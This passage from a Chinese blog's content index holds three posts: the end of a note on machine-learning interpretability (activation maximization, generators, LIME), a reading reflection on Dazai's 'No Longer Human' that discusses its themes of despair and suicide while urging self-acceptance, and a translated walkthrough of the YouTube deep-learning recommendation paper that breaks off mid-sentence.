src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_38-N0lYPkD.png"></p><p>如果直接看最后的 image classifier，可以找一个图片 $X$，这个图片可以让某一个类别的分数越高越好。</p><p>$$<br>X^{*}&#x3D;\arg \max _{X} y_{i}<br>$$</p><p>结果如下，例如图片 0 可以让分类器认为图片 0 的概率最高。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_rybU6dasc_.png"></p><p>可以发现，人看不懂的一堆杂讯模型认为是不同的数字，所以在求解 $X$ 的时候，要加上一些限制，即：</p><p>$$<br>X^{*}&#x3D;\arg \max y_{i}+R(X)<br>$$</p><p>在之前公式的基础上增加了 $R(X)$ 部分，用于衡量 $X$ 有多像数字。我们希望得到的 $X$ 中白色的点越小越好。</p><p>$$<br>R(X)&#x3D;-\sum_{i, j}\left|X_{i j}\right|<br>$$</p><p>加上一些额外的限制之后，得到的结果如下，可以发现有一些数字的形状，但是如果要得到很像数字的图形是很难做到的。需要根据你对 object 的理解加很多的限制。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_bD99f4jIDU.png"></p><h2 id="3-2-使用生成器"><a href="#3-2-使用生成器" class="headerlink" title="3.2 使用生成器"></a>3.2 使用生成器</h2><p>可以自己训练一个 image generator，之后如何利用这个图片生成器来反推我们之前得到的图片分类器学习到了什么？</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_-0V-O4yAwi.png"></p><p>可以把图片生成器和图片分类器拼接到一起：先从一个分布中采集一个数据 $z$，然后使用图片生成器生成一个图片 $X$，再将其送入图片分类器（Image Classifier）中得到分类结果 $y$。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_gnOzbYjz71.png"></p><p>现在有了图片生成器之后，我们就不用找 $X$，而是在找一个 $Z$，能够让 $y_i$ 最好的 $Z$ 记作 $Z^*$。之后把 $Z^*$ 输入 generator 中显示出这个图片，看一下是什么图形。</p><p>产生的让对应的图形分数最高的 $X$ 如下：</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_t69Eahxh6V.png"></p><p>但是往往机器学习的可解释性就是想得到一些符合人们预期和认知的结果，可能实际上模型就是把那些杂讯可以正确的认为是不同的数字，但是只不过人看不懂，导致人们不接受这种解释。</p><h2 id="3-3-其他方法"><a href="#3-3-其他方法" class="headerlink" title="3.3 其他方法"></a>3.3 其他方法</h2><p>可以用一些简单的模型去模拟一个复杂的模型的行为，如果输出结果相同，则可以使用简单的模型去解释复杂模型的行为。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_fP-aE5FITq.png"></p><p>但是黑盒子模型能做到的简单的模型不一定能做到，有一个工作Local Interpretable Model-Agnostic Explanations（LIME）可以让线性模型模仿复杂模型在一小部分区域的行为，这样也可以对复杂模型进行一定程序的解释。</p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录4：人间失格</title>
      <link href="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/"/>
      <url>/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_9dSThQdwpI.png"></p><blockquote><p>《人间失格》（又名《丧失为人的资格》）日本小说家太宰治创作的中篇小说，发表于1948年，是一部半自传体的小说。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>在读这本书之前一直都知道这本书，读了之后才发现这是一个中篇小说，没有那么长，读完感触很深，其中生活中没有很多人那么关注你，所以你也没有必要去在意别人对你的评价。别人夸了你能怎么样，别人诋毁你又能怎么样，so what？</p><p>走自己的路，让别人说去吧。</p><hr><h1 id="2-经典语录"><a href="#2-经典语录" class="headerlink" title="2 经典语录"></a>2 经典语录</h1><ol><li>生而为人，对不起。</li><li>丑角本质上只是一层伪装，是为了自我保护而戴上的面具。</li><li>一有机会，人类可怕的真面目就会在愤怒中不经意地暴露出来。</li><li>在所谓人世间摸爬滚打至今，我唯一愿意视为真理的，就只有这一句话：一切都是会过去的。</li><li>我的不幸，恰恰在于我缺乏拒绝的能力。我害怕一旦拒绝别人，便会在彼此心里留下永远无法愈合的裂痕。</li><li>相互轻蔑却又彼此来往，并一起自我作贱，这就是也上所谓“朋友”的真面目。</li><li>相遇总是措不及防，离别都是蓄谋已久。我们要习惯身边的忽冷忽热，也要看淡那些渐行渐远。</li><li>每天面对同样的事情，不过度欢喜，自然就不会感到过度的悲哀。</li><li>我得死，我必须得死，活着便是罪恶的种子。</li><li>没有人在遭受别人责难与训斥时，还能愉快起来，但我却从人们生气的怒容中看到比狮子、鳄鱼、巨龙更可怕的动物本性。平时他们都将这些本性隐藏着，可一旦找到机会，就会像那些在草原上温文尔雅的牛，忽然甩动自己的尾巴抽死自己肚子上的牛虻。</li><li>在所谓“人世间”摸爬滚打至今，我唯一愿意视为真理的，就只有这一句话。一切都会过去的。</li></ol><hr><h1 id="3-群体中随波逐流，不如孤独行走"><a href="#3-群体中随波逐流，不如孤独行走" class="headerlink" title="3 群体中随波逐流，不如孤独行走"></a>3 群体中随波逐流，不如孤独行走</h1><p>小说的主人公，叫做叶藏，出生在一个颇有些古板的旧式家庭之中。在叶藏小时候，家里面十个人一起吃饭统一沉默，只留下碗筷与菜肴触碰的声音。</p><p>他们用餐地方也微微昏暗，这样的场景给叶藏留下了很深的印象，印在他痛苦的一生之上。因为是小孩子，所以他根本不知道为什么大家要吃饭。</p><p><strong>大人说不吃饭就会死，但他也只是觉得这句话是在威胁他。他觉得吃饭只是一种迷信。</strong>他从小就活在混乱，和对于人类行为浓浓的不解中。</p><p>然后，他开始耍起了插科打诨的手段，以此掩饰自己心中的扭曲。家中的人无论对他说什么，他都不会顶嘴。即便是别人对他恶语相向，他也只是默默地承受攻击，心中却百般挣扎。</p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_x5wsVwNPL-.png"></p><p><strong>他把自己对人类的多般想法藏匿，同时扮出一副天真无邪的模样，甚至自己慢慢都习惯把自己当做一个爱玩滑稽把戏的怪胎。</strong></p><p>他在一次交作文作业的时候，往里面写了自己和母亲坐火车的时候，在火车车厢通道的痰盂撒尿的事。这也只是为了表现自己的“天真无邪”，才故意做的。老师在读完他的作业的时候，满脸通红，一边笑，一边让别的老师也读一读。他得知后，心中是大大的满足。</p><p><strong>或许，有一个词可以形容他的行为，就是“哗众取宠”。</strong></p><p>这个世界上，有这么一群人，哪怕是你很寻常的行为，他也十分地敏感地想到别的地方去。然后为了体面一点，他们表面总是装得云淡风轻，然后还曲意逢迎。</p><p><strong>但是，人就在这样“积极”融入群体中，容易失去自己。</strong>也许，你真的觉得这样使你的人际能力变得更加圆滑，但是等到你真正一个人的时候你会发现，你跟自己却没有相处好。</p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_ResBuIDsUR.png"></p><p>勒庞在《乌合之众》中说：“人一到群体中，智商就严重降低，为了获得认同，个体愿意抛弃是非，用智商去换取那份让人倍感安全的归属感。”</p><p>但正是这份归属感把我们欺骗到，灵魂难以火热，心中只有对于人际的取舍。</p><p><strong>不如，先好好跟自己相处吧。</strong></p><p>群体的“温暖”，总是会让毫无防备的人麻痹于其中。我们当然跟社会是需要纽带的，但是与人交往只是其中的一环。就像是那个极难被理解的尼采，他活在自己的世界中，成为一代先哲，而不是混迹于当时的人潮。</p><p>清醒地独行，远比臃肿地拥簇在人海中更舒服。</p><hr><h1 id="4-与世界格格不入，也要落落大方"><a href="#4-与世界格格不入，也要落落大方" class="headerlink" title="4 与世界格格不入，也要落落大方"></a>4 与世界格格不入，也要落落大方</h1><p>叶藏到东京留学，被“酒色”还有“自杀”两个念头贯穿。一直想逃离人性的扭曲的他，当遇到烟酒和女人的时候，迅速沉沦下去。</p><p>甚至于到了后来，需要一针吗啡，才能让他在酒精的麻痹逃离出来。一开始一天打一针，接下来是两针，再然后就到了一天要打四针的地步。</p><p><strong>现实已经让他很疲倦了，身无分文的状态又让他难行在世道，他选择了跟一个女服务生相约跳海。</strong>但他独自被人给救了上来，而那个女服务生却是真真的丧生了。</p><p>几经辗转之后，他遇到了善良的由子。这样纯真的女孩似乎稀释了他身上的浑浊，但就当他想开始新生活的时候，他却意外亲眼目睹了自己的妻子被他人奸污。</p><p>至此，他真的被逼上了绝境，他对自己下了最后通判：“我已经丧失做人的资格了。”<strong>求死，是他向着浑浊的世道反叛的怒吼，堕落，是他察觉人间丑陋的特意行为。</strong></p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_tldyAVIac5.png"></p><p>可是，这真的是好的解决办法吗？我们都很害怕被别人蒙蔽，但事实是我们最容易被自己蒙蔽。对于世界的很多事情，我们总容易“下意识”地给出偏见，然后伤害自己。</p><p><strong>即便是与世道不相容，我们也可以落落大方。</strong></p><p>尼采曾说“每一个不曾起舞的日子，都是对生命的一种辜负。”既然，我们已经想要脱离了，那么也别辜负自己的生命，在每个日子中独自起舞。<strong>“丧”不应该是最终对自己的处决，毕竟人活一世，不值得也必须值得。</strong></p><p>既然已经远道而来这世间，何不如落落大方一点呢？</p><hr><h1 id="5-一个人活着，一个人乐"><a href="#5-一个人活着，一个人乐" class="headerlink" title="5 一个人活着，一个人乐"></a>5 一个人活着，一个人乐</h1><p>《人间失格》中有一句话：“没有猛然的欢喜，自然不会有悲痛的来袭。”但是，如果为了提防悲痛，不敢大声地欢乐，那么这趟人生之旅还不如一颗石头的一生来的有价值。</p><p><strong>叶藏的一生，不过是将太宰治自己给穿插了进去。而太宰治的人生，可以说是数次坠入深渊的过程。</strong></p><p>在他20岁的时候，他效仿小说家芥川龙之介，吞下了数片安眠药。但因为药量不够，所以他未能如愿。</p><p>第二次，他和一位咖啡馆女招待一起跑到海边，双双殉情。最后，太宰治却被救活了，那位跟他一起赴死的少女却死了。</p><p>他总共自杀了五次，第五次的时候，他顺利地结束了自己的生命。他和他另一个情人一起，跳入东京西郊的河里溺水而亡。两人的腰部，用红色的绳结绑在一起。“不要绝望，在此告辞。”说完这一句话，他便永远地离开了人间。</p><p><strong>其实，从这句话能看出来，太宰治还是很“可爱”的，他从始至终都想着向整个世界乞爱。</strong></p><p>但是，我们何必如此珍重来自世界的关怀呢？可能是因为他少时生活的环境，让他心中对于群体感有着十足的渴望。</p><p><strong>可人生的本质应该是一个人活着，一个人乐。缺少了外界的温柔，我们也可以自己取暖。</strong></p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_fAgICYxZoI.png"></p><p>书名《人间失格》其中“失格”两个字的意思就是失去资格，也就是叶藏口中的“丧失了做人的资格”。太宰治借叶藏，再一次发出了对于自己处境的不甘。</p><p><strong>但亦舒曾说：“无论怎么样，一个人借故堕落总是不值得原谅的，越是没有人爱，越要爱自己。”或许，我们可以把是非观看得轻一点，把自己的“欲望”给宣扬出来。</strong></p><p>可以试着去胡吃海喝，可以试着去挑战极限，但是千万别堕落下去。人生当然有很多“丧”，但那些不“丧”的人不是因为他们的境遇好，而是因为他们相信悲怆的暂时性。</p><p><strong>人间值得，你也值得。</strong></p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_xL4478m2xg.png"></p><p>鲁迅曾这样评价太宰治：“他活在自己的世界里，卑微而自由，他想要打破什么，却没有方向。他的痛苦在于他用心看着漆黑的世界。”</p><p>如果凝视了漆黑，漆黑也便会凝视我们。世界上杂糅了太多的元素，这股漆黑可以说是很显目。但是，世界上也有其他显目的颜色，如解暑的西瓜，如傍晚的晚霞。</p><p><strong>世界的美好多着呢，何必栽培苦涩。</strong></p><p>而且这本《人间失格》的创作也根本不是寻找“丧文化”的同类，而是表达出自己的困境，从而让别人受到提点。即使叶藏被太宰治塑造地无比可怜，但也被描写地特别可爱。也就是说，他是渴望被爱的，渴望被关注的。</p><p>太宰治在书中结尾有一句话：“我们所认识的阿叶，又诚实又乖巧，要是不喝酒的话，不，即使是喝酒，也是一个神一样的好孩子。”</p><p><strong>所以，这本书不能被看做一本“丧文化”的书，它恰恰是想要逃离“丧”。</strong>总之，对自己好一点，即便是人潮对你冷漠，但人人都可以自带心灵烛火，供我们温热。</p><hr><h1 id="6-个人感受"><a href="#6-个人感受" class="headerlink" title="6 个人感受"></a>6 个人感受</h1><p>人的一生有很多种度过的方式，每个人的人生经历都是独一无二的，我认为人在世上最重要的是找到自己，找到自己的内心所向，找到自己的性格，找到属于自己的塔西提岛。</p><p>但是这一点正是最难做到的，或者说，等人们发现自己想要什么、发现内心的自己之后，已经追悔莫及了。所以我有幸发掘到这一点。在生活中最重要的不就是自己的心情吗？钱财和名利只不过是我们实现自己目标的一个手段，有了钱财我们可以出去旅游，可以买很多自己想要的东西。</p><p>也因此，除了我们的家人，我们不用把他人对我们的评价放在心上，突然感觉真的无所谓。之前的我可能会有一些在意他人的看法和评价，以及他人的一些举动，担心自己做的是不是没有其他人好。读了《人间失格》之后，发现叶藏就是这种心理的一个极端，他太过于在意他人的看法，导致完全迷失了自己。</p><blockquote><p>不开心，长生不老也没用；开心，活几天也足够。</p></blockquote><p>现在每天真的都很开心，很满足。感谢叶藏，感谢太宰治，将这种心理状态写了出来，可能现实生活中也有很多这种人吧。专注于自己的生活的感觉真的很好，接下来要学会掌控自己的内心，和自己的意识尽量保持一致。这样每天都过的很充实，很开心。而且感觉未来就掌握在自己的手里，不辜负每一天，加油小周！</p><p><img src="/2024/11/15/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%954%EF%BC%9A%E4%BA%BA%E9%97%B4%E5%A4%B1%E6%A0%BC/image_cwpCiUPe1m.png"></p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文精读5：DNN for YouTube Rec</title>
      <link href="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/"/>
      <url>/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font color=green><strong>论文题目</strong></font>：Deep Neural Networks for YouTube Recommendations<br><font color=green><strong>作者</strong></font>：Google<br><font color=green><strong>发表时间</strong></font>：2016年</p></blockquote><hr><h1 id="DNN-for-YouTube-Rec"><a href="#DNN-for-YouTube-Rec" class="headerlink" title="DNN for YouTube Rec"></a>DNN for YouTube Rec</h1><blockquote><p>YouTube 代表存在规模最大、最复杂的工业推荐系统之一。在本文中，我们以顶层视角描述系统，并专注于深度学习带来的显着性能改进。本文根据经典的两阶段信息检索二分法进行分割：首先，我们详细介绍了深度召回模型，然后描述了单独的排序模型。我们还提供了从设计、迭代和维护大量具有巨大面向用户影响的推荐系统中获得的实际经验和见解。</p></blockquote><h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1 介绍"></a>1 介绍</h1><p>YouTube 是世界上最大的创作、分享和观看视频的平台。YouTube 的推荐系统负责帮助超过 10 亿用户从不断增多的视频库中找到自己感兴趣的内容。在本文中，我们将重点关注深度学习最近对 YouTube 视频推荐系统的巨大影响。图1展示了移动端YouTube在主页推荐视频的页面。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_QhlE3XYOKL.png"></p><blockquote><p>图 1：移动端YouTube在主页推荐视频的页面。</p></blockquote><p>YouTube 的视频推荐遇到的困难主要有三个方面：</p><ul><li><strong>推荐的规模：</strong>许多现有的推荐算法被证明在小规模问题上工作良好，无法在我们的规模上操作。高度专业化的分布式学习算法和高效服务系统对于处理 YouTube 的大规模用户基础和语料库至关重要。</li><li><strong>新鲜度：</strong>YouTube 有一个每秒就会上传很多小时级别的视频的非常动态的候选库。推荐系统应该对新上传的内容能够及时响应，以追踪用户采取的最新动作。从探索&#x2F;开发的角度来看，应将新上传的内容和已有的视频进行平衡。</li><li><strong>噪音：</strong>由于稀疏性和各种不可观察的外部因素，YouTube 上的历史用户行为本质上难以预测。我们很少获得用户满意度的基本事实，而是对嘈杂的隐式反馈信号进行建模。此外，在没有明确定义的本体的情况下，与内容相关的元数据结构很差。我们的算法需要对训练数据的这些特定特征具有鲁棒性。</li></ul><p>与 Google 中的其他产品区域结合，YouTube 经历了一个基本的范式转变，即使用深度学习作为几乎所有学习问题的通用解决方案。我们的系统建立在 Google Brain$^{[4]}$上，最近作为 TensorFlow$^{[1]}$开源。TensorFlow 提供了一个灵活的框架，用于使用大规模分布式训练试验各种深度神经网络架构。我们的模型学习了大约 10 亿个参数，并在数百亿个数据上进行了训练。</p><p>与矩阵分解方法$^{[19]}$的大量研究相比，使用深度神经网络进行推荐系统的工作相对较少。神经网络用于推荐 [17] 中的新闻，[8] 中的引用和 [20] 中的评论分级。协同过滤被表述为 [22] 中的深度神经网络和 [18] 中的自动编码器。Elkahky 等人使用深度学习进行跨域用户建模$^{[5]}$。在基于内容的设置中，Burges 等人使用深度神经网络进行音乐推荐$^{[21]}$。</p><p>本文组织如下：第 2 节介绍了一个简短的系统概述。第 3 节更详细地描述候选生成模型，包括如何训练和用于服务推荐。实验结果表明，该模型如何从隐藏单元的深层和额外的异构信号中受益。第 4 节详细说明了排序模型，包括如何修改经典逻辑回归来训练模型预测视频预期观看时间（而不是点击概率）。实验结果表明，隐藏层的深度在这种情况下也是有帮助的。最后，第 5 节介绍了我们的结论和一些经验。</p><hr><h1 id="2-系统整体介绍"><a href="#2-系统整体介绍" class="headerlink" title="2 系统整体介绍"></a>2 系统整体介绍</h1><p>我们的推荐系统的整体结构如图2所示。该系统由两个神经网络组成：一个用于召回，一个用于排序。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_NlDnLEkDSw.png"></p><blockquote><p>图 2：推荐系统架构，展示了在仅向用户展示推荐视频之前召回和排序候选视频的筛选过程。</p></blockquote><p>召回网络将来自用户的 YouTube 活动历史观看记录作为输入，并从候选库中检索一小部分视频（数百个）。这些候选物品通常与用户的兴趣高度相关。召回网络仅通过协同过滤提供广泛的个性化。用户之间的相似性是根据观看过的视频 ID、搜索查询的 token 和人口统计数据等粗略特征来表达的。</p><p>在推荐列表中提出一些“最佳”建议需要一个精细级别的表示来区分具有高召回率的候选者之间的相对重要性。排序网络通过使用所需的目标函数，并给定一系列描述视频和用户的丰富的特征，给每个视频打分来完成此任务。按其分数进行排名，得分最高的视频展现给用户。</p><p>推荐的两阶段方法使我们能够从非常大的视频语料库（百万）中提出推荐，同时仍然确定手机上出现的少量视频是个性化和吸引用户的。此外，这种设计支持混合其他来源生成的候选物品，例如早期工作中描述的候选物品 [3]。</p><p>在开发过程中，我们广泛使用离线指标（精度、召回率、排名损失等）来指导模型的迭代。然而，为了最终确定算法或模型的有效性，我们依赖于通过线上实验的 A&#x2F;B 测试。在线上实验中，我们可以测量点击率、观看时间和许多其他衡量用户参与度的指标的细微变化。这很重要，因为实际的 A&#x2F;B 结果并不总是与离线实验相关。</p><hr><h1 id="3-召回生成"><a href="#3-召回生成" class="headerlink" title="3 召回生成"></a>3 召回生成</h1><p>在召回期间，庞大的 YouTube 语料库现在被缩小到与用户相关的数百个视频。这里描述的推荐器的前身是在秩损失 [23] 下训练的矩阵分解方法。我们的神经网络模型的早期迭代用仅嵌入用户之前观看的视频的浅层网络来模拟这种分解行为。从这个角度来看，我们的方法可以看作是分解技术的非线性泛化。</p><h2 id="3-1-将推荐问题视为分类"><a href="#3-1-将推荐问题视为分类" class="headerlink" title="3.1 将推荐问题视为分类"></a>3.1 将推荐问题视为分类</h2><p>我们将推荐作为极端的多类分类问题，其中预测问题在基于用户 $U$ 和上下文 $C$ 的整个视频语料库 $V$ 中准确分类数百万个视频 $i$（类）中的观看的特定视频 $ w_t$。</p><p>$$<br>P\left(w_{t}&#x3D;i \mid U, C\right)&#x3D;\frac{e^{v_{i} u}}{\sum_{j \in V} e^{v_{j} u}}<br>$$</p><p>其中 $u \in \mathbb{R}^{N}$ 表示一个对用户的高维嵌入的向量，上下文对和 $v_{j} \in \mathbb{R}^{N}$ 的表示对每个候选视频的嵌入。在这种情况下，嵌入只是将稀疏实体（单个视频、用户等）映射到 $\mathbb{R}^{N}$ 中的稠密向量。深度神经网络的任务是学习用户嵌入 $u$ 作为用户历史和上下文的函数，这对于使用 softmax 分类器区分视频很有用。</p><p>尽管 YouTube 上存在显式反馈机制（点赞&#x2F;不喜欢、产品调查等），但我们使用观看数据的隐式反馈 [16] 来训练模型，其中观看完整个视频的用户是一个正样本。使用完播这种隐式反馈所能构造出来的正样本比显式反馈的『点赞』多了一个数量级，使我们能够在显式反馈极其稀疏的尾部产生更有价值的建议。</p><h3 id="3-1-1-进行高效检索"><a href="#3-1-1-进行高效检索" class="headerlink" title="3.1.1 进行高效检索"></a>3.1.1 进行高效检索</h3><p>为了有效地训练这样一个具有数百万个类的模型，我们依靠一种技术从背后的分布（“候选采样”）中采样负类，然后通过重要性加权 [10] 校正该采样。对于每个示例，真实标签和采样的负类的交叉熵损失最小化。在实践中，采样了几千个负类，对应于比传统 softmax 快 100 倍以上。一种流行的替代方法是分层 softmax [15]，但我们无法达到可比的精度。在分层 softmax 中，遍历树中的每个节点涉及区分通常不相关的类集，使得分类问题变得更加困难和降低性能。</p><p>在服务时，我们需要计算最可能的 N 类（视频），以便选择呈现给用户的前 N 个。在几十毫秒的严格服务延迟下对数百万个项目进行评分需要一个近似评分方案，该方案在类的数量上次线性。以前在 YouTube 上的系统依赖于哈希散列 [24]，这里描述的分类器使用了类似的方法。由于服务时不需要来自 softmax 输出层的校准似然，因此评分问题简化为可以使用通用库的点积空间中的最近邻搜索 [12]。我们发现 A&#x2F;B 测试的结果对最近邻搜索算法的选择并不特别敏感。</p><h2 id="3-2-模型架构"><a href="#3-2-模型架构" class="headerlink" title="3.2 模型架构"></a>3.2 模型架构</h2><p>受连续词袋语言模型 [14] 的启发，我们学习了已有词汇表中每个视频的高维嵌入，并将这些嵌入输入到前馈神经网络中。用户的观看历史由可变长度的稀疏视频 ID 序列表示，该序列通过嵌入映射到密集向量表示。该网络需要固定大小的密集输入，并且简单地平均在几个策略（总和、组件最大值等）中执行的嵌入。重要的是，嵌入是通过正常的梯度下降反向传播更新与所有其他模型参数共同学习的。特征被连接成一个广泛的第一层，然后是几层全连接整流线性单元 (ReLU) [6]。图 3 显示了具有下面描述的额外非视频观看特征输入的通用网络架构。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_VagSxcEIvI.png"></p><blockquote><p>图 3：深度候选生成模型架构，显示嵌入的稀疏特征与密集特征连接。嵌入向量在连接之前进行平均，以将不同大小的稀疏 ID 包转换为适合隐藏层输入的固定宽度向量。所有隐藏层都是全连接层。在训练期间，通过对采样 Softmax 的输出进行梯度下降来最小化交叉熵损失。在推荐时，执行近似最近邻查找以生成数百个候选视频推荐。</p></blockquote><h2 id="3-3-异构信号"><a href="#3-3-异构信号" class="headerlink" title="3.3 异构信号"></a>3.3 异构信号</h2><p>使用深度神经网络作为矩阵分解泛化的一个关键优势是可以轻松地将任意连续和分类特征添加到模型中。搜索历史处理类似于观看历史——每个查询都被标记为 unigrams 和 bigrams，每个 token 都被嵌入。一旦平均，用户的 token 化、嵌入的查询代表一个汇总的稠密搜索历史。统计特征对提供先验很重要，以致于推荐对新用户表现得相当好。用户的地理位置和使用的手机类型被嵌入并拼接在一起。简单的二元和连续特征，例如用户的性别、登录状态和年龄，归一化后为 $[0, 1]$ 直接输入到网络中。</p><h3 id="3-3-1-“发布时间”特征"><a href="#3-3-1-“发布时间”特征" class="headerlink" title="3.3.1 “发布时间”特征"></a>3.3.1 “发布时间”特征</h3><p>每秒都会有几个小时的视频上传到 YouTube。推荐最近发布的（“新鲜”）内容对于 YouTube 来说非常重要。我们一直发现到用户更喜欢最新的内容，尽管这个视频的内容那个用户直接没有接触过。除了简单地推荐用户想要观看的新视频的一阶效应外，引导和传播内容存在关键的次要现象 [11]。</p><p>机器学习系统通常表现出对过去的隐含偏见，因为它们经过训练可以从历史示例中预测未来的行为。视频流行度的分布是高度非平稳的，但我们的推荐器生成的语料库上的多项分布将反映几周训练窗口中的平均观看可能性。为了纠正这一点，我们在训练期间将训练数据的发布时间作为特征。在线上推荐的时候，此功能设置为零（或轻微负面），以反映模型在训练窗口的最后进行预测。</p><p>图 4 展示了这种方法在任意选择的视频 [26] 上的有效性。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_L3boAK_iPX.png"></p><blockquote><p>图 4：对于给定的视频 [26]，以发布时间作为特征训练的模型能够准确地表示数据中观察到的上传时间和时间依赖性流行度。如果没有特征，模型将大致预测训练窗口的平均可能性。</p></blockquote><h2 id="3-4-标签和上下文选择"><a href="#3-4-标签和上下文选择" class="headerlink" title="3.4 标签和上下文选择"></a>3.4 标签和上下文选择</h2><p>需要强调的是，推荐通常涉及解决<strong>代理问题</strong>并将结果转移到特定上下文中。一个经典的例子是，准确预测评分会导致有效的电影推荐 [2]。我们发现，这种代理学习问题的选择对 A&#x2F;B 测试的性能具有相当大的重要性，但使用离线实验很难测量。</p><p>训练示例是从所有 YouTube 观看过的视频（甚至是嵌入在其他网站上的示例）生成的，而不仅仅是观看我们生成的推荐视频。否则，在用户的首页推荐新内容是非常困难的，推荐系统会过度偏向于已经曝光过的物品。如果用户通过我们的推荐之外的方式找到视频，我们希望能够通过协同过滤将这一发现快速传播到其他人。改进实时指标的另一个关键发现是为每个用户生成固定数量的训练示例，并且有效地在损失函数中平等地加权我们的用户。这防止一小部分高度活跃的用户主导损失函数的变化。</p><p>有点违反直觉的是，必须谨慎地从分类器中提取信息，以防止模型利用网站的结构并过度拟合代理问题。例如，用户刚刚发布了“taylor swift”搜索查询的情况。由于我们的问题是预测下一个观看的视频，因此给定此信息的分类器将预测要观看的最可能的视频是那些出现在“taylor swift”的相应搜索结果页面上的视频。毫无疑问，将用户的最后一个搜索页面复制为主页推荐的性能非常差。通过丢弃序列信息并用无序的 token  bag表示搜索查询，则分类器不再直接知道标签的来源。</p><p>视频的自然消费模式通常会导致非常不对称的共观看概率。情节系列通常是按顺序观看的，用户在关注小众的内容之前，通常发现该领域中最受欢迎的艺术家。因此，我们发现预测用户下一次观看的性能要好得多，而不是预测一个随机的 held-out 观看（图 5）。许多协同过滤系统通过保留一个随机项目并从其他用户的浏览记录中进行挑选（5a）中预测它来隐式地选择标签和上下文。这泄漏了未来的信息，并忽略了任何不对称的消费模式。相比之下，我们通过选择一个随机的视频并仅输入用户在保留标签表 (5b) 之前采取的行动来“回滚”用户的历史。</p><p><img src="/2024/11/14/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB5%EF%BC%9ADeep-Neural-Networks-for-YouTube-Recommendations/image_dcqrBJ7HD-.png"></p><blockquote><p>图 5：为模型选择标签和输入上下文对于离线评估具有挑战性，但对实时性能有很大影响。在这里，实体事件 • 是网络的输入特征，而中空事件 ◦ 被排除在外。我们发现预测未来的手表 (5b) 在 A&#x2F;B 测试中表现更好。在 (5b) 中，示例年龄表示为 tmax - tN，其中 tmax 